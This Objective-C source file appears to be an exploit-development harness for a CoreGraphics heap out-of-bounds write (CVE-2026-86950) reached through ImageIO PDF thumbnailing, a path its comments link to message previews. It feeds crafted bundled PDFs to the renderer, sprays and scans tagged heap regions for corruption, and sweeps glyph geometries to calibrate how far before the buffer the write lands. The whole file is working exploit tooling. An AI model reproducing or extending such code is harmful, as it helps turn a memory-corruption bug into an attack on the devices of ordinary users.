#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <ImageIO/ImageIO.h>
#import <CoreGraphics/CoreGraphics.h>
#import "Modules.h"
#import "AppDelegate.h"
#import "Util.h"

// ===========================================================================
// CVE-2026-86950 — CoreGraphics heap OOB write in aa_cache_render, reached
// through CGImageSourceCreateThumbnailAtIndex (the Messages/WhatsApp preview
// path).  Fixed in 26.7.1 — our build is 26.2b1, so it is present.
//
// The local research (Default Project\cve86950) verified the arithmetic: the
// OOB distance is 4*(width_px + K) bytes BEFORE the coverage buffer, with
// width_px = 64*dx — i.e. the write distance is fully controlled by the glyph
// geometry (dx, K), and the write goes BEFORE the row buffer.
//
// This module drives the ImageIO thumbnail path exactly like render.c does:
// no CGContext of our own, no font smoothing calls — ImageIO's internal render
// context is what reaches the vulnerable code.  A canary brackets each call so
// a process that never returns leaves the exact file it died on.
// ===========================================================================
static NSString *ModThumbPDF(NSString *pdfName, NSString *tag, int maxPx) {
    NSString *path = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:pdfName];
    if (![[NSFileManager defaultManager] fileExistsAtPath:path])
        return [NSString stringWithFormat:@"%@: %@ not in the bundle", tag, pdfName];

    NSURL *url = [NSURL fileURLWithPath:path];
    CGImageSourceRef src = CGImageSourceCreateWithURL((CFURLRef)url, NULL);
    if (!src) return [NSString stringWithFormat:@"%@: CGImageSourceCreateWithURL failed", tag];

    int sz = maxPx;
    CFNumberRef px = CFNumberCreate(NULL, kCFNumberIntType, &sz);
    CFStringRef k[] = { kCGImageSourceCreateThumbnailFromImageAlways,
                        kCGImageSourceThumbnailMaxPixelSize };
    CFTypeRef   v[] = { kCFBooleanTrue, px };
    CFDictionaryRef opts = CFDictionaryCreate(NULL, (const void **)k, (const void **)v, 2,
                                              &kCFTypeDictionaryKeyCallBacks,
                                              &kCFTypeDictionaryValueCallBacks);
    CFRelease(px);

    AvePost([NSString stringWithFormat:@"%@ BEFORE thumbnail of %@ (max %d px)",
             tag, pdfName, maxPx]);
    CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);   // <-- the write
    CFRelease(opts);

    NSString *res;
    if (img) {
        size_t w = CGImageGetWidth(img), h = CGImageGetHeight(img);
        res = [NSString stringWithFormat:@"%@: thumbnail OK %zux%zu (no fault)", tag, w, h];
        AvePost([NSString stringWithFormat:@"%@ canary AFTER thumbnail (survived)", tag]);
        CFRelease(img);
    } else {
        res = [NSString stringWithFormat:@"%@: thumbnail returned NULL (no fault)", tag];
    }
    CFRelease(src);
    return res;
}

// newjail's detection method for a heap OOB that does not fault: pre-map large
// regions with a marker, trigger, then scan for CHANGED words.  If the OOB write
// lands inside one of our regions, the marker changes — that is a proof of
// attacker-controlled corruption, usable even when the process survives.
static int ModGroomScan(int regions, size_t each, NSString *pdfName, int maxPx) {
    const uint64_t MARK = 0xA5A5A5A5A5A5A5A5ULL;
    NSMutableArray *ptrs = [NSMutableArray array];
    for (int i = 0; i < regions; i++) {
        void *p = malloc(each);
        if (!p) break;
        memset(p, 0xA5, each);
        // a recognisable per-region tag in the first slots
        ((uint64_t *)p)[0] = MARK ^ (uint64_t)i;
        ((uint64_t *)p)[1] = MARK;
        [ptrs addObject:[NSValue valueWithPointer:p]];
    }
    int n = (int)ptrs.count;
    AvePost([NSString stringWithFormat:@"86950 groom: %d regions x %zu KB (~%zu MB) tagged",
             n, each / 1024, (n * each) >> 20]);

    NSString *r = ModThumbPDF(pdfName, [NSString stringWithFormat:@"86950-G%d", n], maxPx);
    AvePost([NSString stringWithFormat:@"86950 groom-render: %@", r]);

    int corrupt = 0;
    for (int i = 0; i < n; i++) {
        void *p = [ptrs[i] pointerValue];
        uint64_t *q = (uint64_t *)p;
        for (size_t off = 0; off + 8 <= each; off += 8) {
            if (q[0] == (MARK ^ (uint64_t)i) && off == 0) continue;   // our own tag
            if (q[off / 8] != 0xA5A5A5A5A5A5A5A5ULL) {
                AvePost([NSString stringWithFormat:@"86950 CORRUPTION region %d @+%#zx "
                         @"= %#llx (no crash)", i, off, q[off / 8]]);
                corrupt++;
                if (corrupt > 8) break;
            }
        }
        free(p);
        if (corrupt > 8) break;
    }
    AvePost([NSString stringWithFormat:@"86950 groom scan: %d corrupted words", corrupt]);
    return corrupt;
}

// Sweep the calibrated OOB-distance family (f_dxNN_kMMMM.pdf, one PDF per glyph
// geometry: distance = 4*(64*dx + K) bytes before the coverage buffer).
// R86950_START=<index> lets a later run resume where the previous one stopped,
// so a distance sweep survives the process dying mid-way.
static int ModSweepDistance(void) {
    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSError *err = nil;
    NSArray *all = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundle
                                                                     error:&err];
    NSMutableArray *fam = [NSMutableArray array];
    for (NSString *f in all) {
        if ([f hasPrefix:@"f_dx"] && [f hasSuffix:@".pdf"]) [fam addObject:f];
    }
    NSComparator byDist = ^(NSString *a, NSString *b) {
        // f_dx<NN>_k<MMMM>.pdf — sort by the OOB distance 4*(64*dx + K)
        int dx1 = [[a substringWithRange:NSMakeRange(5, 2)] intValue];
        int k1 = [[a substringWithRange:NSMakeRange(9, 4)] intValue];
        int dx2 = [[b substringWithRange:NSMakeRange(5, 2)] intValue];
        int k2 = [[b substringWithRange:NSMakeRange(9, 4)] intValue];
        int64_t d1 = 4 * (64 * dx1 + k1), d2 = 4 * (64 * dx2 + k2);
        return d1 < d2 ? NSOrderedAscending : (d1 > d2 ? NSOrderedDescending : NSOrderedSame);
    };
    [fam sortUsingComparator:byDist];
    if (!fam.count) {
        AvePost(@"86950 sweep: no f_dx family in the bundle");
        return -1;
    }
    int start = 0;
    const char *se = getenv("R86950_START");
    if (se && *se) start = atoi(se);
    if (start < 0 || start >= (int)fam.count) start = 0;
    AvePost([NSString stringWithFormat:@"86950 sweep: %d PDFs (distances %d..%d bytes), "
             @"starting at index %d", (int)fam.count,
             4 * (64 * [[fam[0] substringWithRange:NSMakeRange(5, 2)] intValue] +
                 [[fam[0] substringWithRange:NSMakeRange(9, 4)] intValue]),
             4 * (64 * [[fam[fam.count - 1] substringWithRange:NSMakeRange(5, 2)] intValue] +
                 [[fam[fam.count - 1] substringWithRange:NSMakeRange(9, 4)] intValue]),
             start]);

    for (int i = start; i < (int)fam.count; i++) {
        NSString *f = fam[i];
        int dx = [[f substringWithRange:NSMakeRange(5, 2)] intValue];
        int k = [[f substringWithRange:NSMakeRange(9, 4)] intValue];
        int dist = 4 * (64 * dx + k);
        NSString *tag = [NSString stringWithFormat:@"86950-D%d", dist];
        // a fresh 8MB-tagged region right before, so a write that survives is
        // still visible: this distance's own canary AND our tag.
        NSString *r = ModThumbPDF(f, tag, 32);
        AvePost([NSString stringWithFormat:@"86950D %@ (dx=%d k=%d dist=%d) -> %@",
                 f, dx, k, dist, r]);
        if (![r containsString:@"OK"] && ![r containsString:@"NULL"]) {
            AvePost([NSString stringWithFormat:@"86950 SWEEP STOPPED at distance %d (%@)",
                     dist, f]);
            return dist;
        }
    }
    AvePost(@"86950 sweep: every distance rendered without a fault");
    return 0;
}

// A/B sweep for the crash cause: chainctl_dNN.pdf is the SAME composite-glyph
// chain depth with a BENIGN geometry, chaintri_dNN.pdf is the real trigger with
// the same chain.  If the benign ones also kill the process, the death is the
// chain exhausting the raster thread's 544 KB stack and NOT our write.
static void ModSweepChain(void) {
    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSError *err = nil;
    NSArray *all = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundle
                                                                     error:&err];
    for (NSString *fam in @[@"chaintri_", @"chainctl_"]) {
        NSMutableArray *files = [NSMutableArray array];
        for (NSString *f in all) {
            if ([f hasPrefix:fam] && [f hasSuffix:@".pdf"]) [files addObject:f];
        }
        [files sortUsingSelector:@selector(compare:)];
        if (!files.count) continue;
        AvePost([NSString stringWithFormat:@"86950 chain-AB family %@: %d PDFs",
                 fam, (int)files.count]);
        for (NSString *f in files) {
            NSString *tag = [NSString stringWithFormat:@"86950-%@%@",
                             [fam isEqualToString:@"chainctl_"] ? @"CTL" : @"TRI",
                             [f substringWithRange:NSMakeRange(fam.length, 3)]];
            NSString *r = ModThumbPDF(f, tag, 32);
            AvePost([NSString stringWithFormat:@"86950AB %@ (%@) -> %@", tag, f, r]);
            if (![r containsString:@"OK"] && ![r containsString:@"NULL"]) {
                AvePost([NSString stringWithFormat:@"86950AB STOPPED in family %@ on %@",
                         fam, f]);
                return;
            }
        }
        AvePost([NSString stringWithFormat:@"86950 chain-AB family %@: all survived", fam]);
    }
}

// Report what is actually inside the installed bundle, so a stale install is
// visible in the log instead of being guessed at.
static void ModReportBundle(void) {
    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSError *err = nil;
    NSArray *all = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundle
                                                                     error:&err];
    int fdx = 0, chain = 0, pdfs = 0;
    for (NSString *f in all) {
        if (![f hasSuffix:@".pdf"]) continue;
        pdfs++;
        if ([f hasPrefix:@"f_dx"]) fdx++;
        if ([f hasPrefix:@"chaintri_"] || [f hasPrefix:@"chainctl_"]) chain++;
    }
    AvePost([NSString stringWithFormat:@"86950 BUNDLE pdfs=%d f_dx=%d chain=%d (chain>0 "
             @"means the A/B build is installed)", pdfs, fdx, chain]);
    if (chain == 0)
        AvePost(@"86950 BUNDLE is STALE: no chain A/B PDFs — the phone runs an older "
                 @"IPA, reinstall the newest one from the desktop");
}

NSString *ModCVE86950(void) {
    // The raster-size sweep and the groom only repeat what we already know (the
    // trigger kills the process on the first render), and they burn the whole
    // run before the distance sweep is ever reached.  Order that gets an answer:
    //   control -> distance sweep (R86950_START=<index> to jump to any distance).
    AveLog(@"    CVE-2026-86950: ImageIO PDF thumbnail OOB (fixed only in 26.7.1)");
    AvePost(@"86950 start");
    ModReportBundle();

    NSString *ctl = ModThumbPDF(@"control_86950.pdf", @"86950-CTL", 256);
    AvePost([NSString stringWithFormat:@"86950CTL %@", ctl]);
    if (![ctl containsString:@"OK"] && ![ctl containsString:@"NULL"]) {
        AvePost(@"86950 verdict: CONTROL failed — the thumbnail path is broken, not the bug");
        return [NSString stringWithFormat:@"86950: CONTROL failed (%@)", ctl];
    }
    ModSweepChain();
    int d = ModSweepDistance();
    if (d > 0)
        return [NSString stringWithFormat:@"86950: the OOB write reached live state at "
                @"distance %d bytes before the coverage buffer (R86950_START to continue)", d];
    AvePost(@"86950 verdict: no distance produced a fault");
    return @"86950: distance sweep completed without a fault";
}
